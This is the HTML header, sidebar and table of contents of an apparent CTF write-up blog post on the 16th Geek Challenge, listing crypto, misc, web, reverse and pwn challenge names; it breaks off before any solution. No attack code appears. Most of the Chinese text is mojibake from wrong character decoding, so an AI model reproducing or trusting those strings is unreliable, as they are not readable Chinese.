<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>ç¬¬åå…­å±Šæå®¢å¤§æŒ‘æˆ˜ | Lazzaro</title><meta name="description" content="â€‹     10.24 20:00 - 11.24 20:00 (UTC+8) åˆ°åä¸¤å‘¨æ²¡æ€ä¹ˆåšäº†ã€‚ Rank: 10  CRYPTOez_xor å¬è¯´æœ‰ç®—æ³•é«˜æ‰‹,æˆ‘ç¨å¾®æ”¹äº†ä¸€ä¸‹ç­¾åˆ°é¢˜,å¿«æ¥è¯•è¯•å§,(flagå‰ç¼€æ˜¯syc)  å·²çŸ¥ N &#x3D; p*q*s*rï¼Œå¹¶ç»™å‡º n &#x3D; p*qã€gift &#x3D; p ^ qã€gift1 &#x3D; s &amp; rã€gift2 &#x3D; s ^ rï¼Œä»¥åŠå¯†æ–‡ c å’Œå…¬é’¥ e &#x3D;"><meta property="og:type" content="article"><meta property="og:title" content="ç¬¬åå…­å±Šæå®¢å¤§æŒ‘æˆ˜"><meta property="og:url" content="https://lazzzaro.github.io/2025/10/29/match-%E7%AC%AC%E5%8D%81%E5%85%AD%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/index.html"><meta property="og:site_name" content="Lazzaro"><meta property="og:description" content="â€‹     10.24 20:00 - 11.24 20:00 (UTC+8) åˆ°åä¸¤å‘¨æ²¡æ€ä¹ˆåšäº†ã€‚ Rank: 10  CRYPTOez_xor å¬è¯´æœ‰ç®—æ³•é«˜æ‰‹,æˆ‘ç¨å¾®æ”¹äº†ä¸€ä¸‹ç­¾åˆ°é¢˜,å¿«æ¥è¯•è¯•å§,(flagå‰ç¼€æ˜¯syc)  å·²çŸ¥ N &#x3D; p*q*s*rï¼Œå¹¶ç»™å‡º n &#x3D; p*qã€gift &#x3D; p ^ qã€gift1 &#x3D; s &amp; rã€gift2 &#x3D; s ^ rï¼Œä»¥åŠå¯†æ–‡ c å’Œå…¬é’¥ e &#x3D;"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://lazzzaro.github.io/2025/10/29/match-%E7%AC%AC%E5%8D%81%E5%85%AD%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20251029113524718.png"><meta property="og:image" content="https://lazzzaro.github.io/2025/10/29/match-%E7%AC%AC%E5%8D%81%E5%85%AD%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20251029113719264.png"><meta property="article:published_time" content="2025-10-29T02:32:59.000Z"><meta property="article:modified_time" content="2025-11-27T12:11:11.948Z"><meta property="article:author" content="Lazzaro"><meta property="article:tag" content="2025èµ›"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://lazzzaro.github.io/2025/10/29/match-%E7%AC%AC%E5%8D%81%E5%85%AD%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/image-20251029113524718.png"><link rel="canonical" href="https://lazzzaro.github.io/2025/10/29/match-%E7%AC%AC%E5%8D%81%E5%85%AD%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/index.html"><link rel="alternate" href="/atom.xml" title="Lazzaro" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="https://cdn.jsdelivr.net/npm/katex@0.9.0/dist/katex.min.css" rel="stylesheet"><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"3Ft5J9t2Jl0eb5Zr",ck:"3Ft5J9t2Jl0eb5Zr",hashMode:!0})</script><meta name="generator" content="Hexo 7.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/Lazzzaro" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">Lazzaro</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">CTFå¼±é¸¡è‡ªè¿›é˜¶</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> flag{}___Orz</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="æœç´¢"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">Ã—</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">æ€»è§ˆ</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">æ±‡æ€»</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">ç±»åˆ«</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">å…³é”®è¯</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook"><i class="icon"></i> <span class="menu-title">æ¥ç•™ä¸ªè¨€ ğŸ‘‰ğŸ‘‰ğŸ‘‰</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">ç±»åˆ«</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/">crypto</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/match/">match</a><span class="category-list-count">53</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/other/">other</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">17</span></li></ul></div></div><div class="widget"><h3 class="widget-title">å…³é”®è¯äº‘</h3><div class="widget-body tagcloud"><a href="/tags/2020%E8%B5%9B/" style="font-size:14px">2020èµ›</a> <a href="/tags/2021%E8%B5%9B/" style="font-size:13.88px">2021èµ›</a> <a href="/tags/2022%E8%B5%9B/" style="font-size:13.63px">2022èµ›</a> <a href="/tags/2023%E8%B5%9B/" style="font-size:13.75px">2023èµ›</a> <a href="/tags/2024%E8%B5%9B/" style="font-size:13.25px">2024èµ›</a> <a href="/tags/2025%E8%B5%9B/" style="font-size:13.38px">2025èµ›</a> <a href="/tags/AES/" style="font-size:13px">AES</a> <a href="/tags/Android/" style="font-size:13px">Android</a> <a href="/tags/Bash/" style="font-size:13px">Bash</a> <a href="/tags/CMS/" style="font-size:13px">CMS</a> <a href="/tags/CSRF/" style="font-size:13px">CSRF</a> <a href="/tags/DES/" style="font-size:13px">DES</a> <a href="/tags/ECC/" style="font-size:13px">ECC</a> <a href="/tags/IDA/" style="font-size:13px">IDA</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/Java/" style="font-size:13.13px">Java</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/OT/" style="font-size:13px">OT</a> <a href="/tags/PHP/" style="font-size:13.25px">PHP</a> <a href="/tags/RCE/" style="font-size:13px">RCE</a> <a href="/tags/RSA/" style="font-size:13.13px">RSA</a> <a href="/tags/SQL/" style="font-size:13px">SQL</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/SSTI/" style="font-size:13px">SSTI</a> <a href="/tags/Sage/" style="font-size:13px">Sage</a> <a href="/tags/USB/" style="font-size:13px">USB</a> <a href="/tags/Unity/" style="font-size:13px">Unity</a> <a href="/tags/WebAssembly/" style="font-size:13px">WebAssembly</a> <a href="/tags/XSS/" style="font-size:13px">XSS</a> <a href="/tags/XXE/" style="font-size:13px">XXE</a> <a href="/tags/angr/" style="font-size:13px">angr</a> <a href="/tags/fuzz/" style="font-size:13px">fuzz</a> <a href="/tags/gmpy2/" style="font-size:13px">gmpy2</a> <a href="/tags/hash/" style="font-size:13px">hash</a> <a href="/tags/js/" style="font-size:13px">js</a> <a href="/tags/node-js/" style="font-size:13.13px">node.js</a> <a href="/tags/pwntools/" style="font-size:13px">pwntools</a> <a href="/tags/python/" style="font-size:13.5px">python</a> <a href="/tags/wasm/" style="font-size:13px">wasm</a> <a href="/tags/z3/" style="font-size:13px">z3</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">å†…ç½‘</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">ååºåˆ—åŒ–</a> <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size:13px">åç¼–è¯‘</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size:13px">åè°ƒè¯•</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size:13px">å–è¯</a> <a href="/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/" style="font-size:13px">åé‡å­å¯†ç </a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size:13px">å‘½ä»¤è¡Œ</a> <a href="/tags/%E5%9B%BE%E5%83%8F/" style="font-size:13px">å›¾åƒ</a> <a href="/tags/%E5%9D%97%E5%AF%86%E7%A0%81/" style="font-size:13px">å—å¯†ç </a> <a href="/tags/%E5%A0%86/" style="font-size:13px">å †</a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size:13.13px">å¯†ç </a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">ææƒ</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13px">æ–‡ä»¶ä¸Šä¼ </a> <a href="/tags/%E6%9B%B2%E7%BA%BF/" style="font-size:13px">æ›²çº¿</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">æ ˆ</a> <a href="/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/" style="font-size:13px">æ ¼å¯†ç </a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size:13px">æ ¼å¼åŒ–å­—ç¬¦ä¸²</a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size:13px">æ³¨å…¥</a> <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/" style="font-size:13px">æµå¯†ç </a> <a href="/tags/%E6%B5%81%E9%87%8F/" style="font-size:13px">æµé‡</a> <a href="/tags/%E6%B7%B7%E6%B7%86/" style="font-size:13px">æ··æ·†</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size:13px">æ¸—é€</a> <a href="/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/" style="font-size:13px">ç¦»æ•£å¯¹æ•°</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size:13.13px">ç®—æ³•</a> <a href="/tags/%E7%BB%95%E8%BF%87/" style="font-size:13.5px">ç»•è¿‡</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size:13px">ç¼–ç </a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size:13.13px">è„šæœ¬</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size:13px">è‡ªåŠ¨åŒ–</a> <a href="/tags/%E9%80%83%E9%80%B8/" style="font-size:13px">é€ƒé€¸</a> <a href="/tags/%E9%9A%90%E5%86%99/" style="font-size:13.25px">éšå†™</a></div></div><div class="widget"><h3 class="widget-title">æ±‡æ€»</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/12/">åäºŒæœˆ 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">åæœˆ 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">å…«æœˆ 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">å…­æœˆ 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">åäºŒæœˆ 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">åä¸€æœˆ 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">ä¸‰æœˆ 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">åä¸€æœˆ 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">ä¹æœˆ 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">äº”æœˆ 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">äºŒæœˆ 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">ä¸€æœˆ 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">åäºŒæœˆ 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">åä¸€æœˆ 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">ä¹æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">ä¸ƒæœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">å…­æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">äº”æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">äºŒæœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">ä¸€æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">åäºŒæœˆ 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">åä¸€æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">åæœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">ä¹æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">å…«æœˆ 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">å…­æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">äº”æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">å››æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">ä¸‰æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">äºŒæœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">ä¸€æœˆ 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">åäºŒæœˆ 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">åä¸€æœˆ 2020</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">åæœˆ 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">ä¹æœˆ 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">å…«æœˆ 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">ä¸ƒæœˆ 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">å…­æœˆ 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">äº”æœˆ 2020</a><span class="archive-list-count">24</span></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">æ–‡ç« ç›®å½•</h3><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">1.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-xor"><span class="toc-number">1.1.</span> <span class="toc-text">ez_xor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Caesar-Slot-Machine"><span class="toc-number">1.2.</span> <span class="toc-text">Caesar Slot Machine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-ecc"><span class="toc-number">1.3.</span> <span class="toc-text">ez_ecc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pem"><span class="toc-number">1.4.</span> <span class="toc-text">pem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-rabin"><span class="toc-number">1.5.</span> <span class="toc-text">baby_rabin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xor-revenge"><span class="toc-number">1.6.</span> <span class="toc-text">xor_revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezLLL"><span class="toc-number">1.7.</span> <span class="toc-text">ezLLL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Disclose"><span class="toc-number">1.8.</span> <span class="toc-text">Disclose</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dp-spill"><span class="toc-number">1.9.</span> <span class="toc-text">dp_spill</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#simple-DH"><span class="toc-number">1.10.</span> <span class="toc-text">simple-DH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-lwe"><span class="toc-number">1.11.</span> <span class="toc-text">ez_lwe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-RSA"><span class="toc-number">1.12.</span> <span class="toc-text">easy_RSA?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hensel"><span class="toc-number">1.13.</span> <span class="toc-text">Hensel</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ-LCG"><span class="toc-number">1.14.</span> <span class="toc-text">EZ_LCG</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S-box"><span class="toc-number">1.15.</span> <span class="toc-text">S_box</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP"><span class="toc-number">2.1.</span> <span class="toc-text">HTTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%97%83%EF%B8%8F%F0%9F%97%83%EF%B8%8F"><span class="toc-number">2.2.</span> <span class="toc-text">ğŸ—ƒï¸ğŸ—ƒï¸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#evil-mcp"><span class="toc-number">2.3.</span> <span class="toc-text">evil_mcp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bite-off-picture"><span class="toc-number">2.4.</span> <span class="toc-text">Bite off picture</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1Z-Sign"><span class="toc-number">2.5.</span> <span class="toc-text">1Z_Sign</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blockchain-SignIn"><span class="toc-number">2.6.</span> <span class="toc-text">Blockchain SignIn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dream"><span class="toc-number">2.7.</span> <span class="toc-text">Dream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Points"><span class="toc-number">2.8.</span> <span class="toc-text">Points</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mission-Ghost-Signal"><span class="toc-number">2.9.</span> <span class="toc-text">Mission Ghost Signal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Expression-Parser"><span class="toc-number">2.10.</span> <span class="toc-text">Expression Parser</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hidden"><span class="toc-number">2.11.</span> <span class="toc-text">hidden</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRDT"><span class="toc-number">2.12.</span> <span class="toc-text">CRDT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gift"><span class="toc-number">2.13.</span> <span class="toc-text">gift</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4ak5ra"><span class="toc-number">2.14.</span> <span class="toc-text">4ak5ra</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E5%8D%B7"><span class="toc-number">2.15.</span> <span class="toc-text">é—®å·</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">3.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%BF%E5%9F%BA%E9%87%8C%E6%96%AF%E8%BF%BD%E4%B9%8C%E9%BE%9F"><span class="toc-number">3.1.</span> <span class="toc-text">é˜¿åŸºé‡Œæ–¯è¿½ä¹Œé¾Ÿ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vibe-SEO"><span class="toc-number">3.2.</span> <span class="toc-text">Vibe SEO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Xross-The-Finish-Line"><span class="toc-number">3.3.</span> <span class="toc-text">Xross The Finish Line</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Expression"><span class="toc-number">3.4.</span> <span class="toc-text">Expression</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#one-last-image"><span class="toc-number">3.5.</span> <span class="toc-text">one_last_image</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#popself"><span class="toc-number">3.6.</span> <span class="toc-text">popself</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sequal-No-Uta"><span class="toc-number">3.7.</span> <span class="toc-text">Sequal No Uta</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-read"><span class="toc-number">3.8.</span> <span class="toc-text">ez_read</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BE%E5%B9%B4%E7%BB%A7%E6%89%BF"><span class="toc-number">3.9.</span> <span class="toc-text">ç™¾å¹´ç»§æ‰¿</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-seralize"><span class="toc-number">3.10.</span> <span class="toc-text">ez-seralize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eeeeezzzzzzZip"><span class="toc-number">3.11.</span> <span class="toc-text">eeeeezzzzzzZip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E5%9C%A8%E8%84%9A%E4%B8%8B"><span class="toc-number">3.12.</span> <span class="toc-text">è·¯åœ¨è„šä¸‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Image-Viewer"><span class="toc-number">3.13.</span> <span class="toc-text">Image Viewer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSE"><span class="toc-number">4.</span> <span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#encode"><span class="toc-number">4.1.</span> <span class="toc-text">encode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-pyyy"><span class="toc-number">4.2.</span> <span class="toc-text">ez_pyyy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#only-flower"><span class="toc-number">4.3.</span> <span class="toc-text">only_flower</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezRu3t"><span class="toc-number">4.4.</span> <span class="toc-text">ezRu3t</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#QYQS%E3%81%AE%E5%A5%87%E5%A6%99%E5%86%92%E9%99%A9"><span class="toc-number">4.5.</span> <span class="toc-text">QYQSã®å¥‡å¦™å†’é™©</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezSMC"><span class="toc-number">4.6.</span> <span class="toc-text">ezSMC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gensh1n"><span class="toc-number">4.7.</span> <span class="toc-text">Gensh1n</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#QYQS%E3%81%AE%E5%A5%87%E5%A6%99%E5%86%92%E9%99%A92"><span class="toc-number">4.8.</span> <span class="toc-text">QYQSã®å¥‡å¦™å†’é™©2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack-bomb"><span class="toc-number">4.9.</span> <span class="toc-text">stack_bomb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-vm"><span class="toc-number">4.10.</span> <span class="toc-text">ez_vm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GeekBinder"><span class="toc-number">4.11.</span> <span class="toc-text">GeekBinder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BD%E4%BA%A7%E3%81%AE%E5%85%89"><span class="toc-number">4.12.</span> <span class="toc-text">å›½äº§ã®å…‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#obfuscat3"><span class="toc-number">4.13.</span> <span class="toc-text">obfuscat3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">5.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#old-rop"><span class="toc-number">5.1.</span> <span class="toc-text">old_rop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mission-Calculator"><span class="toc-number">5.2.</span> <span class="toc-text">Mission Calculator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mission-Cipher-Text"><span class="toc-number">5.3.</span> <span class="toc-text">Mission Cipher Text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mission-Exception-Registration"><span class="toc-number">5.4.</span> <span class="toc-text">Mission Exception Registration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AC%A1%E5%85%83%E5%9B%9A%E7%AC%BC"><span class="toc-number">5.5.</span> <span class="toc-text">æ¬¡å…ƒå›šç¬¼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mission-Transponder"><span class="toc-number">5.6.</span> <span class="toc-text">Mission Transponder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mission-Absolutely-Abyss"><span class="toc-number">5.7.</span> <span class="toc-text">Mission Absolutely Abyss</span></a></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-match-ç¬¬åå…­å±Šæå®¢å¤§æŒ‘æˆ˜" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">ç¬¬åå…­å±Šæå®¢å¤§æŒ‘æˆ˜</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2025/10/29/match-%E7%AC%AC%E5%8D%81%E5%85%AD%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" class="article-date"><time datetime="2025-10-29T02:32:59.000Z" itemprop="datePublished">2025-10-29</time> 